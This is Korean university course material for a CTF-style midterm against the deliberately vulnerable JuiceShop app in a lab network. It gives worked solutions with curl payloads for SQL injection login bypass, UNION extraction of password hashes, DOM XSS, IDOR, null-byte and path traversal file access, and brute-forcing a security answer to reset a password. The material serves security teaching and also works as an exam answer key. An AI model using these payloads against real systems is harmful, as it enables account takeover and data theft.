# Week 08: 중간고사 - CTF 실습

## 시험 개요

이번 주는 **CTF(Capture The Flag)** 형식의 중간고사이다. Week 02~07에서 배운 모든 기법을 활용하여 JuiceShop의 챌린지를 풀어야 한다.

### CTF란?

CTF(Capture The Flag)는 보안 기술을 겨루는 대회 형식이다. 취약점을 찾아 공격에 성공하면 "플래그(flag)"를 획득한다. JuiceShop에서는 챌린지를 해결하면 자동으로 점수가 기록된다.

### 시험 조건

| 항목 | 내용 |
|------|------|
| 시간 | 120분 |
| 문제 수 | 10문제 |
| 배점 | 각 10점 (총 100점) |
| 도구 | curl, nmap, python3, 브라우저 사용 가능 |
| 금지 | 인터넷 검색 (JuiceShop 해답 사이트), 타인과 협력 |
| 환경 | opsclaw(10.20.30.201) → web(10.20.30.80:3000) |

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| opsclaw | 10.20.30.201 | 실습 기지 (여기서 작업) |
| web | 10.20.30.80 | JuiceShop:3000 |
| secu | 10.20.30.1 | 방화벽/IPS |
| siem | 10.20.30.100 | Wazuh SIEM |

SSH 접속:
```bash
sshpass -p1 ssh -o StrictHostKeyChecking=no user@10.20.30.201
```

---

## 1. JuiceShop Scoreboard 시스템

### 1.1 Scoreboard 접근

JuiceShop에는 숨겨진 Scoreboard 페이지가 있다. 이 페이지에서 챌린지 해결 현황을 확인할 수 있다.

```bash
# 브라우저에서 접근:
# http://10.20.30.80:3000/#/score-board
echo "Scoreboard URL: http://10.20.30.80:3000/#/score-board"

# API로 챌린지 목록 확인
curl -s http://10.20.30.80:3000/api/Challenges \
  | python3 -m json.tool | head -50
```

### 1.2 챌린지 난이도

JuiceShop 챌린지는 별(star)로 난이도를 표시한다:

| 난이도 | 설명 | 이번 시험 |
|--------|------|-----------|
| 1 star | 매우 쉬움 | 문제 1~3 |
| 2 stars | 쉬움 | 문제 4~6 |
| 3 stars | 보통 | 문제 7~9 |
| 4 stars | 어려움 | 문제 10 (보너스) |

### 1.3 챌린지 해결 확인

```bash
# 해결된 챌린지 확인 (solved=true인 것)
curl -s http://10.20.30.80:3000/api/Challenges \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
solved = [c for c in data if c.get('solved')]
unsolved = [c for c in data if not c.get('solved')]
print(f'Solved: {len(solved)} / Total: {len(data)}')
for c in solved:
    print(f'  [v] {c[\"name\"]} ({c[\"difficulty\"]} star)')
" 2>/dev/null
```

---

## 2. 시험 준비: 핵심 명령어 정리

시험 시작 전에 각 주제별 핵심 명령어를 정리한다.

### 2.1 Week 02 - 정보수집

```bash
# nmap 스캔
nmap -sV -p 1-10000 10.20.30.80
sudo nmap -A 10.20.30.80

# 웹 핑거프린팅
curl -I http://10.20.30.80:3000
whatweb http://10.20.30.80:3000

# robots.txt
curl http://10.20.30.80:3000/robots.txt

# /ftp 탐색
curl -s http://10.20.30.80:3000/ftp
```

### 2.2 Week 03 - HTTP/JWT

```bash
# 사용자 등록
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test1234!","passwordRepeat":"Test1234!","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"test"}'

# 로그인 및 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test1234!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

# JWT 디코딩
echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip()+'=='
print(json.dumps(json.loads(base64.urlsafe_b64decode(d)),indent=2))
"
```

### 2.3 Week 04 - SQL Injection

```bash
# Admin 로그인 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}'

# 검색 SQLi
curl -s "http://10.20.30.80:3000/rest/products/search?q='+OR+1=1--"
```

### 2.4 Week 05 - XSS

```bash
# DOM XSS (브라우저에서)
# http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert('xss')">

# Reflected XSS
# http://10.20.30.80:3000/#/track-result?id=<iframe src="javascript:alert('xss')">
```

### 2.5 Week 06 - 인증/접근제어

```bash
# 보안 질문 확인
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op"

# IDOR
curl -s http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
```

### 2.6 Week 07 - 파일접근

```bash
# Null byte 우회
curl -s "http://10.20.30.80:3000/ftp/eastere.gg%2500.md"

# 경로 탐색
curl -s "http://10.20.30.80:3000/ftp/../../../etc/passwd"
```

---

## 3. CTF 문제 (총 10문제)

### 문제 1: Score Board 발견 (10점)

**주제**: 정보수집 (Week 02)
**난이도**: 1 star
**목표**: JuiceShop의 숨겨진 Score Board 페이지를 찾아라.

**힌트:**
- JuiceShop의 JavaScript 소스에서 라우팅 정보를 찾아보라
- 브라우저에서 URL을 직접 입력해보라

**풀이 가이드:**

```bash
# Step 1: JavaScript 소스에서 경로 찾기
curl -s http://10.20.30.80:3000/main.js 2>/dev/null | grep -oE 'score-board|scoreboard|score' | head -5

# Step 2: 브라우저에서 접근
echo "URL: http://10.20.30.80:3000/#/score-board"
```

**채점 기준**: Score Board 페이지 URL을 제출하면 정답.

---

### 문제 2: FTP 디렉토리 접근 (10점)

**주제**: 정보수집 (Week 02)
**난이도**: 1 star
**목표**: JuiceShop의 /ftp 디렉토리에 접근하여 파일 목록을 획득하라.

**풀이 가이드:**

```bash
# Step 1: robots.txt에서 힌트 확인
curl -s http://10.20.30.80:3000/robots.txt

# Step 2: /ftp 디렉토리 접근
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool
```

**채점 기준**: /ftp 디렉토리의 전체 파일 목록을 제출하면 정답.

---

### 문제 3: 관리자 섹션 접근 (10점)

**주제**: 정보수집 (Week 02) + 접근제어 (Week 06)
**난이도**: 1 star
**목표**: JuiceShop의 관리자(Administration) 페이지를 찾아서 접근하라.

**풀이 가이드:**

```bash
# Step 1: JavaScript에서 admin 경로 찾기
curl -s http://10.20.30.80:3000/main.js 2>/dev/null | grep -oE 'administration|admin-panel|admin' | sort -u

# Step 2: 관리자 계정으로 로그인 필요
# Week 04의 SQLi로 admin 로그인 후 접근
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# Step 3: 브라우저에서 admin 토큰으로 접근
echo "URL: http://10.20.30.80:3000/#/administration"
echo "Token: $ADMIN_TOKEN"
```

**채점 기준**: 관리자 페이지의 스크린샷 또는 URL + 접근 방법을 제출하면 정답.

---

### 문제 4: SQL Injection으로 Admin 로그인 (10점)

**주제**: SQL Injection (Week 04)
**난이도**: 2 stars
**목표**: SQL Injection을 사용하여 admin@juice-sh.op 계정으로 로그인하라.

**풀이 가이드:**

```bash
# Step 1: 로그인 API 확인
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}'

# Step 2: SQL Injection 시도
# 방법 1: 모든 사용자 반환
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
  | python3 -m json.tool

# 방법 2: admin 직접 지정
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' \
  | python3 -m json.tool
```

**채점 기준**: admin 계정의 JWT 토큰을 제출하고, 사용한 SQLi 페이로드를 설명하면 정답.

---

### 문제 5: DOM XSS 공격 (10점)

**주제**: XSS (Week 05)
**난이도**: 2 stars
**목표**: JuiceShop에서 DOM-based XSS를 실행하여 alert 팝업을 띄워라.

**풀이 가이드:**

```bash
# 검색 기능에 XSS 페이로드 삽입
# 브라우저에서 다음 URL 접근:
echo "http://10.20.30.80:3000/#/search?q=<iframe src=\"javascript:alert(\`xss\`)\">"

# 또는 주문 추적에서:
echo "http://10.20.30.80:3000/#/track-result?id=<iframe src=\"javascript:alert(\`xss\`)\">"
```

**채점 기준**: XSS가 실행된 화면 스크린샷 또는 사용한 페이로드를 제출하면 정답.

---

### 문제 6: 0-star 리뷰 등록 (10점)

**주제**: HTTP 프로토콜 (Week 03) + 접근제어 (Week 06)
**난이도**: 2 stars
**목표**: 별점 0개인 피드백을 등록하라. (UI에서는 최소 1개)

**풀이 가이드:**

```bash
# Step 1: 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# Step 2: Captcha 가져오기
CAPTCHA_RESPONSE=$(curl -s http://10.20.30.80:3000/api/Captchas/ \
  -H "Authorization: Bearer $TOKEN")
CAPTCHA_ID=$(echo "$CAPTCHA_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['captchaId'])" 2>/dev/null)
CAPTCHA_ANSWER=$(echo "$CAPTCHA_RESPONSE" | python3 -c "import sys,json; print(json.load(sys.stdin)['answer'])" 2>/dev/null)

echo "Captcha ID: $CAPTCHA_ID, Answer: $CAPTCHA_ANSWER"

# Step 3: rating=0으로 피드백 제출 (API 직접 호출)
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"UserId\":22,\"captchaId\":$CAPTCHA_ID,\"captcha\":\"$CAPTCHA_ANSWER\",\"comment\":\"Zero star feedback\",\"rating\":0}" \
  | python3 -m json.tool
```

**채점 기준**: rating이 0인 피드백이 성공적으로 등록된 것을 확인하면 정답.

---

### 문제 7: 다른 사용자의 장바구니 열람 - IDOR (10점)

**주제**: 접근제어 (Week 06)
**난이도**: 3 stars
**목표**: 일반 사용자 토큰으로 다른 사용자(ID=1, admin)의 장바구니 내용을 열람하라.

**풀이 가이드:**

```bash
# Step 1: 일반 사용자로 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# Step 2: 자신의 장바구니 확인 (정상 동작)
MY_ID=$(echo "$TOKEN" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip()+'=='
print(json.loads(base64.urlsafe_b64decode(d))['data']['id'])
" 2>/dev/null)
echo "My ID: $MY_ID"

curl -s http://10.20.30.80:3000/rest/basket/$MY_ID \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool | head -10

# Step 3: admin(ID=1)의 장바구니 접근 시도
curl -s http://10.20.30.80:3000/rest/basket/1 \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool
```

**채점 기준**: admin(ID=1)의 장바구니 내용을 제출하면 정답.

---

### 문제 8: Confidential Document 다운로드 (10점)

**주제**: 파일접근 (Week 07)
**난이도**: 3 stars
**목표**: /ftp 디렉토리에서 제한된 확장자의 파일을 Null byte 우회로 다운로드하라.

**풀이 가이드:**

```bash
# Step 1: /ftp 파일 목록 확인
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool

# Step 2: .md/.pdf가 아닌 파일 직접 다운로드 시도
curl -s -o /dev/null -w "%{http_code}\n" http://10.20.30.80:3000/ftp/eastere.gg

# Step 3: Null byte 우회
curl -s "http://10.20.30.80:3000/ftp/eastere.gg%2500.md"

# Step 4: 다른 파일도 시도
curl -s "http://10.20.30.80:3000/ftp/suspicious_errors.yml%2500.md"
curl -s "http://10.20.30.80:3000/ftp/incident-support.kdbx%2500.md" -o /tmp/incident-support.kdbx

# acquisitions.md는 정상 다운로드 가능
curl -s http://10.20.30.80:3000/ftp/acquisitions.md
```

**채점 기준**: Null byte 우회로 다운로드한 파일의 내용을 제출하면 정답.

---

### 문제 9: Admin 비밀번호 재설정 (10점)

**주제**: 인증 (Week 06)
**난이도**: 3 stars
**목표**: admin@juice-sh.op의 보안 질문을 맞춰서 비밀번호를 재설정하라.

**풀이 가이드:**

```bash
# Step 1: 보안 질문 확인
curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op" \
  | python3 -m json.tool

# Step 2: 보안 질문 답변 추측
# 힌트: JuiceShop의 admin 보안 질문 답변은 공개된 정보에서 추론 가능
# 질문이 "Your eldest siblings middle name?" 일 경우, 가능한 답변 시도

ANSWERS=("Samuel" "sam" "Admin" "admin" "test" "Zaya" "John" "Jane")
for answer in "${ANSWERS[@]}"; do
  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"NewPass123!\",\"repeat\":\"NewPass123!\"}")
  STATUS=$(echo "$RESULT" | python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'user' in d else d.get('error','FAIL'))" 2>/dev/null)
  echo "Answer '$answer': $STATUS"
  if [[ "$STATUS" == "SUCCESS" ]]; then
    echo "[!] Password reset successful with answer: $answer"
    break
  fi
done

# Step 3: 재설정된 비밀번호로 로그인 확인
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"NewPass123!"}' \
  | python3 -m json.tool
```

**채점 기준**: 비밀번호 재설정에 성공하고, 새 비밀번호로 로그인한 결과를 제출하면 정답.

---

### 문제 10: 전체 사용자 데이터 추출 (10점, 보너스)

**주제**: SQL Injection 심화 (Week 04) + 접근제어 (Week 06)
**난이도**: 4 stars
**목표**: 모든 사용자의 이메일과 비밀번호 해시를 추출하라.

**풀이 가이드:**

```bash
# 방법 1: Admin 토큰으로 API 접근
ADMIN_TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"x"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

curl -s http://10.20.30.80:3000/api/Users/ \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)['data']
print(f'Total users: {len(data)}')
print('-' * 60)
for user in data:
    print(f\"ID: {user['id']}, Email: {user['email']}\")
    if 'password' in user:
        print(f\"  Password hash: {user['password']}\")
" 2>/dev/null

# 방법 2: UNION SQL Injection으로 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert'))+UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users--" \
  | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)['data']
    for item in data:
        if '@' in str(item.get('name','')):
            print(f\"Email: {item['name']}, Hash: {item.get('description','')}\")
except: print('UNION attack failed - try adjusting columns')
" 2>/dev/null
```

**채점 기준**: 모든 사용자의 이메일 목록을 제출하고, 추출 방법을 설명하면 정답.

---

## 4. 채점 기준

| 등급 | 점수 | 기준 |
|------|------|------|
| A+ | 90~100 | 9~10문제 해결 + 풀이 과정 명확 |
| A | 80~89 | 8문제 해결 |
| B+ | 70~79 | 7문제 해결 |
| B | 60~69 | 6문제 해결 |
| C+ | 50~59 | 5문제 해결 |
| C | 40~49 | 4문제 해결 |
| D | 30~39 | 3문제 해결 |
| F | 0~29 | 2문제 이하 |

### 감점 기준

- 풀이 과정 없이 정답만 제출: -3점/문제
- 다른 학생의 풀이를 그대로 복사: 해당 문제 0점
- 시험 시간 초과: -2점/10분

### 가산점

- 제시된 방법 외의 창의적 풀이: +3점/문제
- 방어 방법까지 기술: +2점/문제
- OpsClaw를 활용한 자동화 풀이: +3점

---

## 5. 답안 제출 양식

각 문제에 대해 다음 형식으로 제출하라:

```
## 문제 N: [문제 제목]

### 사용한 기법
[Week 0X에서 배운 XXX 기법]

### 풀이 과정
1. [첫 번째 단계]
   ```bash
   [실행한 명령어]
   ```
2. [두 번째 단계]
   ...

### 결과
[획득한 플래그/데이터/스크린샷]

### 방어 방법 (가산점)
[이 취약점을 어떻게 방어할 수 있는지]
```

---

## 6. OpsClaw 활용 (가산점)

OpsClaw Manager API를 사용하여 CTF 풀이를 자동화하면 가산점을 받을 수 있다.

```bash
# CTF 프로젝트 생성
PROJECT_ID=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week08-ctf-midterm","request_text":"중간고사 CTF 자동화","master_mode":"external"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "Project ID: $PROJECT_ID"

# Stage 전환
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/plan \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute \
  -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 여러 챌린지를 한 번에 실행
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1, "instruction_prompt":"curl -s http://10.20.30.80:3000/robots.txt", "risk_level":"low"},
      {"order":2, "instruction_prompt":"curl -s http://10.20.30.80:3000/ftp", "risk_level":"low"},
      {"order":3, "instruction_prompt":"curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'\\'' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\"", "risk_level":"medium"},
      {"order":4, "instruction_prompt":"curl -s http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op", "risk_level":"low"},
      {"order":5, "instruction_prompt":"nmap -sV -p 22,80,443,3000 10.20.30.80", "risk_level":"low"}
    ],
    "subagent_url": "http://localhost:8002"
  }'

# 전체 결과 확인
curl -s -H "X-API-Key: opsclaw-api-key-2026" \
  http://localhost:8000/projects/$PROJECT_ID/evidence/summary \
  | python3 -m json.tool

# 완료 보고서 생성
curl -s -X POST http://localhost:8000/projects/$PROJECT_ID/completion-report \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "summary": "중간고사 CTF 자동화 완료",
    "outcome": "success",
    "work_details": [
      "Score Board 발견",
      "FTP 디렉토리 접근",
      "SQL Injection admin 로그인",
      "보안 질문 확인",
      "포트 스캔 완료"
    ]
  }'
```

---

## 7. 시험 후 복습 포인트

시험이 끝난 후 다음 사항을 복습하라:

### 해결하지 못한 문제

- 어떤 기법이 필요했는가?
- 어디서 막혔는가?
- 힌트를 보고 다시 풀어보라

### Week 02~07 핵심 개념 정리

| 주차 | 핵심 기법 | 방어 방법 |
|------|-----------|-----------|
| 02 | nmap 스캔, 웹 핑거프린팅 | 포트 닫기, 배너 숨기기 |
| 03 | HTTP 분석, JWT 디코딩 | 보안 헤더, HttpOnly 쿠키 |
| 04 | SQL Injection | 매개변수화 쿼리, ORM |
| 05 | XSS (Reflected/Stored/DOM) | 출력 인코딩, CSP |
| 06 | 인증 우회, IDOR | RBAC, 서버 측 권한 검증 |
| 07 | SSRF, 파일 업로드, 경로 탐색 | 입력 검증, 화이트리스트 |

---

## 핵심 요약

- CTF는 보안 기술을 종합적으로 평가하는 실습 방식이다
- 각 문제는 Week 02~07에서 배운 기법을 직접 적용하는 것이다
- 풀이 **과정**이 결과만큼 중요하다 -- 단계별로 기록하라
- 방어 방법까지 이해하면 가산점을 받을 수 있다
- OpsClaw를 활용한 자동화는 실무에서 매우 유용한 역량이다

> **다음 주 예고**: Week 09부터는 방어 기법과 보안 모니터링을 다룬다. 공격을 이해했으므로 이제 어떻게 막을 것인지 배운다.
